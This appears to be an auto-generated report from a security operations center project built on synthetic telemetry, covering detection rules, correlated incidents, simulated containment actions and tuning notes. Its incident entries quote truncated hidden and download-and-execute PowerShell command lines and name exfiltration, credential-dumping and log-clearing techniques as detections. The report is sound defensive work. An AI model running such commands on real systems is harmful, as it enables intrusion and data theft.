# SOC-PROJECT - Security Operations Center: Build & Operations Report

_Generated 2026-09-03 06:46:02 UTC by `python soc.py report`. Telemetry window: 2026-09-02 08:00-12:00 IST (synthetic)._

## 1. Shift summary

| Metric | Value |
|---|---|
| Log sources wired up | 7 |
| Raw records read | 10,445 |
| Normalized events | 10,443 |
| Ingest time | 1.35 s |
| Parse errors (measured, not swallowed) | 0 (0.00% blindness) |
| Alerts raised | 29 |
| Incidents after correlation | 7 |
| Alert -> incident compression | 29:1 -> 7 |
| Simulated response actions | 16 |
| Analyst decisions recorded | 0 |
| Alert severity mix | high=14, medium=8, critical=6, low=1 |
| MITRE techniques seen (firing rules) | 33 |
| Median detection latency (MTTD) | 240 s — one sweep 4 min behind the event stream |
| Median time to containment (MTTR) | 1146 s |
| Detection throughput | 7,736 events/s over 1.35 s |

## 2. Detection results

| Score | Sev | Rule | Detection | Hits | Primary entities |
|---|---|---|---|---|---|
| 100 | high | SOC-BRUTE-001 | Brute-force authentication attempts from a single external | 219 | administrator, m.kumar +10 · OWA-01, WS-FINANCE-07 +6 · 203.0.113.44 |
| 100 | critical | SOC-LOGIN-003 | Successful logon from an external IP that was just brute-f | 3 | m.kumar, administrator · WS-FINANCE-07, OWA-01 · 203.0.113.44 |
| 100 | critical | SOC-C2-022 | Beacon to a host on the threat-intel feed | 74 | m.kumar · WS-FINANCE-07 · 10.10.31.27 · cdn-update-service.net · svcmon.exe |
| 100 | critical | SOC-C2-022 | Beacon to a host on the threat-intel feed | 14 | WS-FINANCE-07 · 10.10.31.27 |
| 98 | high | SOC-EXFIL-024 | Large outbound transfer to an external host | 8 | m.kumar · WS-FINANCE-07 · 10.10.31.27 · exfil-drop.cloud · rclone.exe |
| 97 | high | SOC-C2-023 | Beaconing detected by interval regularity (no IOC required | 39 | m.kumar · WS-FINANCE-07 · 10.10.31.27 · cdn-update-service.net · svcmon.exe |
| 92 | high | SOC-C2-021 | Cobalt Strike / malleable-C2 URI pattern | 70 | m.kumar · WS-FINANCE-07 · 10.10.31.27 · cdn-update-service.net · svcmon.exe |
| 86 | critical | SOC-CRED-013 | Credential dumping - handle opened on lsass.exe | 1 | SYSTEM · WS-FINANCE-07 · perfmon.exe |
| 84 | medium | SOC-CSTUF-004 | Password spray across many accounts from one source | 219 | administrator, m.kumar +10 · OWA-01, WS-FINANCE-07 +6 · 203.0.113.44 |
| 84 | medium | SOC-CSTUF-004 | Password spray across many accounts from one source | 25 | root · linux-prod-01 · 45.155.205.10 · sshd |
| 84 | medium | SOC-BRUTE-002 | SSH brute force against a Linux host | 24 | root · linux-prod-01 · 45.155.205.10 · sshd |
| 82 | high | SOC-INIT-033 | Exploit-framework request against a public web app | 3 | 198.51.100.23 |
| 75 | critical | SOC-RANSOM-030 | Mass file encryption indicators | 300 | m.kumar · WS-FINANCE-07 · svcmon.exe |
| 74 | critical | SOC-EVADE-014 | Volume shadow copy deletion (pre-ransomware) | 1 | m.kumar · WS-FINANCE-07 · vssadmin.exe |
| 72 | medium | SOC-CSTUF-004 | Password spray across many accounts from one source | 21 | a.priya, m.kumar +7 · WS-MKT-02, WS-FINANCE-07 +3 · 203.0.113.44 |
| 72 | high | SOC-EVADE-015 | Windows event log cleared | 1 | m.kumar · DC-01 · 10.10.31.27 · wevtutil.exe |
| 69 | high | SOC-LATERAL-034 | Lateral SMB from a host that just ran a suspicious process | 9 | m.kumar · WS-FINANCE-07 · 10.10.31.27 · 192.0.2.99 · powershell.exe |
| 69 | high | SOC-LATERAL-034 | Lateral SMB from a host that just ran a suspicious process | 2 | j.raja · WS-ENG-12 · 10.10.31.58 · powershell.exe |
| 63 | medium | SOC-SCAN-020 | Vertical port scan against the perimeter | 48 | 198.51.100.23 |
| 62 | medium | SOC-DGA-026 | DGA / dynamic-DNS lookups | 12 | WS-FINANCE-07 · 10.10.31.27 |
| 61 | medium | SOC-SCAN-020 | Vertical port scan against the perimeter | 13 | 45.155.205.10 |
| 61 | high | SOC-IMPTVL-005 | Impossible travel for a single account | 2 | a.priya · WS-MKT-02 · 103.216.220.14, 104.28.55.10 |
| 57 | high | SOC-PSH-010 | Obfuscated or download-and-execute PowerShell | 1 | m.kumar · WS-FINANCE-07 · powershell.exe |
| 57 | high | SOC-DESTROY-032 | Mass deletion of user data after encryption | 60 | m.kumar · WS-FINANCE-07 · svcmon.exe |
| 56 | high | SOC-PROC-012 | Office or mail client spawning a shell | 1 | m.kumar · WS-FINANCE-07 · powershell.exe |
| 56 | high | SOC-PERSIST-011 | Scheduled task or autostart key pointing at a user-writabl | 1 | m.kumar · WS-FINANCE-07 · schtasks.exe |
| 56 | high | SOC-DNSTUN-027 | DNS tunneling / oversized DNS responses | 30 | WS-FINANCE-07 · 10.10.31.27 |
| 53 | low | SOC-OWA-006 | Repeated web-mail authentication failures | 51 | 203.0.113.44 |
| 38 | medium | SOC-EVADE-016 | Host firewall disabled | 1 | m.kumar · WS-FINANCE-07 · netsh.exe |

## 3. Incidents, narrative and response

### INC-20260903-001 - Campaign: Brute-force + 21 related

- Priority **P1** | severity critical | score 100 | status contained | 22 alerts from 20 rules
- Window 2026-09-02T02:50:00+00:00 -> 2026-09-02T04:30:00+00:00 | SLA 2026-09-02T03:50:00+00:00
- Attack chain: `initial-access -> execution -> persistence -> defense-evasion -> credential-access -> lateral-movement -> command-and-control -> exfiltration -> impact`
- Techniques: T1003.001, T1021.002, T1029, T1048, T1048.003, T1053.005, T1059, T1059.001, T1070.001, T1071, T1071.001, T1071.004, T1078, T1078.004, T1105, T1110, T1110.003, T1110.004, T1204.002, T1485, T1486, T1489, T1490, T1547.001, T1562.004, T1567.002, T1568.002, T1583.001
- Entities: `user.name` administrator, m.kumar, oracle +9; `host.name` OWA-01, WS-FINANCE-07, DC-01 +5; `source.ip` 203.0.113.44, 10.10.31.27, 103.216.220.14 +1; `destination.ip` 10.10.20.40, 151.101.1.69, 140.82.112.6 +2; `destination.domain` 192.0.2.99, cdn-update-service.net, exfil-drop.c; `process.name` powershell.exe, svcmon.exe, netsh.exe +5; `url.path` /beacon.ps1, /submit/task.php, /upload/chunk1.zi; `network.bytes` 84055, 98213, 1398 +9; `process.command_line` powershell.exe -nop -w hidden -enc jabuageazqbta

```text
08:20:00  HIGH      score 100 SOC-BRUTE-001    Brute-force authentication attempts from a single ex [T1110,T1110.003]
08:20:00  CRITICAL  score 100 SOC-LOGIN-003    Successful logon from an external IP that was just b [T1078,T1078.004]
08:20:00  MEDIUM    score  84 SOC-CSTUF-004    Password spray across many accounts from one source  [T1110.004]
08:30:02  MEDIUM    score  72 SOC-CSTUF-004    Password spray across many accounts from one source  [T1110.004]
08:32:15  HIGH      score  69 SOC-LATERAL-034  Lateral SMB from a host that just ran a suspicious p [T1021.002]
08:32:15  HIGH      score  57 SOC-PSH-010      Obfuscated or download-and-execute PowerShell        [T1059.001]
08:32:15  HIGH      score  56 SOC-PROC-012     Office or mail client spawning a shell               [T1204.002,T1059]
08:32:36  CRITICAL  score 100 SOC-C2-022       Beacon to a host on the threat-intel feed            [T1071,T1105]
08:32:36  CRITICAL  score 100 SOC-C2-022       Beacon to a host on the threat-intel feed            [T1071,T1105]
08:32:36  HIGH      score  97 SOC-C2-023       Beaconing detected by interval regularity (no IOC re [T1071.001,T1029]
08:32:36  HIGH      score  92 SOC-C2-021       Cobalt Strike / malleable-C2 URI pattern             [T1071.001,T1105]
09:32:15  MEDIUM    score  38 SOC-EVADE-016    Host firewall disabled                               [T1562.004]
09:32:25  HIGH      score  61 SOC-IMPTVL-005   Impossible travel for a single account               [T1078]
09:33:25  CRITICAL  score  86 SOC-CRED-013     Credential dumping - handle opened on lsass.exe      [T1003.001]
    ... 8 further detection(s) in this incident
```

**Automated response**

- `block_ip_at_waf` -> `203.0.113.44`: blocked for 24h at edge WAF <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `disable_account` -> `administrator`: account disabled (reversible) <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `force_password_reset` -> `administrator`: password reset + MFA re-enrolment required at next logon <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `isolate_host` -> `OWA-01`: network isolation granted (EDR), SMB/HTTP blocked, management path open <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `kill_process_tree` -> `powershell.exe`: process tree terminated, binary hashed + uploaded <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `quarantine_file` -> `c:\users\m.kumar\documents\finance\2026\invoice_4400.locked`: artifact quarantined, path added to deny list <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `revoke_sessions` -> `administrator`: all Kerberos/SSO tickets revoked <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_
- `require_mfa_reenrollment` -> `administrator`: MFA re-enrolment policy applied <br>_justification: command-and-control + credential-access + defense-evasion +  -> SOC-BRUTE-001, SOC-C2-021, SOC-C2-022, SOC-C2-023, SOC-CRED-013, SOC-CSTUF-004, SOC-DE_

### INC-20260903-002 - Campaign: Password spray across & SSH brute force

- Priority **P1** | severity medium | score 84 | status contained | 2 alerts from 2 rules
- Window 2026-09-02T08:20:00+00:00 -> 2026-09-02T08:21:06+00:00 | SLA 2026-09-02T16:20:00+00:00
- Attack chain: `credential-access`
- Techniques: T1021.004, T1110, T1110.004
- Entities: `user.name` root; `host.name` linux-prod-01; `source.ip` 45.155.205.10; `process.name` sshd

```text
13:50:00  MEDIUM    score  84 SOC-CSTUF-004    Password spray across many accounts from one source  [T1110.004]
13:50:02  MEDIUM    score  84 SOC-BRUTE-002    SSH brute force against a Linux host                 [T1110,T1021.004]
```

**Automated response**

- `block_ip_at_waf` -> `45.155.205.10`: blocked for 24h at edge WAF <br>_justification: credential-access -> SOC-BRUTE-002, SOC-CSTUF-004_
- `disable_account` -> `root`: account disabled (reversible) <br>_justification: credential-access -> SOC-BRUTE-002, SOC-CSTUF-004_
- `force_password_reset` -> `root`: password reset + MFA re-enrolment required at next logon <br>_justification: credential-access -> SOC-BRUTE-002, SOC-CSTUF-004_
- `revoke_sessions` -> `root`: all Kerberos/SSO tickets revoked <br>_justification: credential-access -> SOC-BRUTE-002, SOC-CSTUF-004_
- `require_mfa_reenrollment` -> `root`: MFA re-enrolment policy applied <br>_justification: credential-access -> SOC-BRUTE-002, SOC-CSTUF-004_

### INC-20260903-003 - Exploit-framework request against a public web app - 198.51.100.23

- Priority **P1** | severity high | score 82 | status contained | 1 alerts from 1 rules
- Window 2026-09-02T02:44:00+00:00 -> 2026-09-02T02:44:00+00:00 | SLA 2026-09-02T06:44:00+00:00
- Attack chain: `initial-access`
- Techniques: T1190
- Entities: `source.ip` 198.51.100.23; `url.path` /.env; `network.bytes` 741

```text
08:14:00  HIGH      score  82 SOC-INIT-033     Exploit-framework request against a public web app   [T1190]
```

**Automated response**

- `block_ip_at_waf` -> `198.51.100.23`: blocked for 24h at edge WAF <br>_justification: initial-access -> SOC-INIT-033_
- `disable_account` -> `n/a`: SKIPPED - built-in/service identity, disabling it would break the platform; reset credentials instead <br>_justification: initial-access -> SOC-INIT-033_
- `force_password_reset` -> `n/a`: password reset + MFA re-enrolment required at next logon <br>_justification: initial-access -> SOC-INIT-033_

### INC-20260903-004 - Lateral SMB from a host that just ran a suspicious process - j.raja

- Priority **P2** | severity high | score 69 | status new | 1 alerts from 1 rules
- Window 2026-09-02T04:33:25+00:00 -> 2026-09-02T04:59:31+00:00 | SLA 2026-09-02T08:33:25+00:00
- Attack chain: `lateral-movement`
- Techniques: T1021.002
- Entities: `user.name` j.raja; `host.name` WS-ENG-12; `source.ip` 10.10.31.58; `destination.ip` 10.10.20.40; `process.name` powershell.exe; `network.bytes` 73864; `process.command_line` powershell.exe -command iex (new-object net.webc

```text
10:03:25  HIGH      score  69 SOC-LATERAL-034  Lateral SMB from a host that just ran a suspicious p [T1021.002]
```

**Automated response**

- `none` -> `-`: no automated response <br>_justification: no alert met the policy bar (critical, or high severity with high/medium confidence, or score >= 80)_

### INC-20260903-005 - Vertical port scan against the perimeter - 198.51.100.23

- Priority **P2** | severity medium | score 63 | status new | 1 alerts from 1 rules
- Window 2026-09-02T02:42:00+00:00 -> 2026-09-02T02:44:21+00:00 | SLA 2026-09-02T10:42:00+00:00
- Attack chain: `reconnaissance`
- Techniques: T1046, T1595.001
- Entities: `source.ip` 198.51.100.23; `destination.ip` 10.10.20.30; `network.bytes` 0

```text
08:12:00  MEDIUM    score  63 SOC-SCAN-020     Vertical port scan against the perimeter             [T1595.001,T1046]
```

**Automated response**

- `none` -> `-`: no automated response <br>_justification: no alert met the policy bar (critical, or high severity with high/medium confidence, or score >= 80)_

### INC-20260903-006 - Vertical port scan against the perimeter - 45.155.205.10

- Priority **P2** | severity medium | score 61 | status new | 1 alerts from 1 rules
- Window 2026-09-02T02:45:07+00:00 -> 2026-09-02T02:46:31+00:00 | SLA 2026-09-02T10:45:07+00:00
- Attack chain: `reconnaissance`
- Techniques: T1046, T1595.001
- Entities: `source.ip` 45.155.205.10; `destination.ip` 10.10.20.40; `network.bytes` 0

```text
08:15:07  MEDIUM    score  61 SOC-SCAN-020     Vertical port scan against the perimeter             [T1595.001,T1046]
```

**Automated response**

- `none` -> `-`: no automated response <br>_justification: no alert met the policy bar (critical, or high severity with high/medium confidence, or score >= 80)_

### INC-20260903-007 - Repeated web-mail authentication failures - 203.0.113.44

- Priority **P3** | severity low | score 53 | status new | 1 alerts from 1 rules
- Window 2026-09-02T02:50:00+00:00 -> 2026-09-02T02:52:42+00:00 | SLA 2026-09-03T02:50:00+00:00
- Attack chain: `credential-access`
- Techniques: T1110.001
- Entities: `source.ip` 203.0.113.44; `url.path` /owa/auth.owa; `network.bytes` 512, 419, 797 +9

```text
08:20:00  LOW       score  53 SOC-OWA-006      Repeated web-mail authentication failures            [T1110.001]
```

**Automated response**

- `none` -> `-`: no automated response <br>_justification: no alert met the policy bar (critical, or high severity with high/medium confidence, or score >= 80)_

## 4. Triage decisions worth defending

| Alert | Decision | Reasoning |
|---|---|---|
| `SOC-SCAN-020` | false positive (filtered) | 203.0.113.77 is the licensed vulnerability scanner. Showing *why* the filter exists is the point: auto-blocking it would have broken an approved test. |
| `SOC-DISCOVERY-017` | true positive | discovery alone is low severity and normally closed; it stays because it shares the host entity with the credential-access chain. |
| `SOC-PSH-010` | true positive | encoded command + `DownloadString` + `IEX`, parented by Outlook, no change record. Filter only exempts `githubusercontent.com`. |
| `SOC-C2-022` vs `SOC-C2-023` | complementary | 022 is IOC matching (instant, dies when the domain rotates); 023 is interval regularity (works on a brand-new domain, needs tuning). A SOC needs both. |
| `SOC-CSTUF-004` | monitor | the distinct-account threshold is meant to catch sprays; on this dataset it is driven by one user's typo storm - a good example of why `confidence` and `severity` are separate fields. |

### What the analyst actually decided in this run

*No analyst decisions recorded for this dataset.*  The buttons in the dashboard write them to `data/processed/triage_state.jsonl`; re-run `python soc.py report` after triaging and they appear here, which is the point of a journal over a mutable status field.

## 5. Coverage and tuning

- Rules in repo: **29**, fired on this dataset: **24** (83%), idle: 5
- ATT&CK tactic coverage: 10 tactics
- Idle rules (no matching telemetry in this scenario - kept for coverage, reviewed at tuning time):
  - `SOC-ACCT-007` New account created then added to a privileged group _(persistence)_
  - `SOC-DISC-017` Account and host discovery commands _(discovery)_
  - `SOC-EXFIL-025` Outbound SMB to a non-internal address _(exfiltration)_
  - `SOC-DNS-028` DGA lookups where one finally resolved _(command-and-control)_
  - `SOC-RANSOM-031` Ransom note written to user directories _(impact)_

Next tuning knobs: per-rule `min_events`/`window_minutes`, the `filter` deny-lists, the beaconing CoV ceiling (0.08), the correlation window (60 min) and `auto_close_below_score`. Each is a recall/false-positive trade-off that must be measured, not guessed.

## 6. Design notes (what makes this a SOC and not a log script)

1. **Normalize first.** Vendor field names are mapped to one schema at ingest (`soc/parsers.py::ALIASES`), so a rule is written once for all sources.
2. **Detection = predicate + statistics.** Thresholds on distinct values, sequence dependencies (`requires`) and a behavioural baseline (CoV) are what make alerts defensible rather than string matches.
3. **Score, don't just flag.** `soc/enrich.py` adds asset criticality, account privilege, threat-intel hits and transfer volume to the severity, because the same detection on a DC and on a kiosk is not the same problem.
4. **Correlate before you queue.** `soc/cases.py` merges alerts sharing an entity inside a window into one incident with a TTP narrative.
5. **Respond, then measure.** Playbooks are tactic-triggered and evidence-linked; MTTD/MTTR and FP rate close the loop.

## 7. Limitations

- Synthetic telemetry; the parsers, rules and correlation logic are the artifact.
- Stateless batch run - no watermarking for late events, no 14-day baselines.
- Static GeoIP/intel tables instead of live feeds; playbook actions are simulated.
- No persistence/queue for multi-analyst workflow (triage state is a JSONL journal).
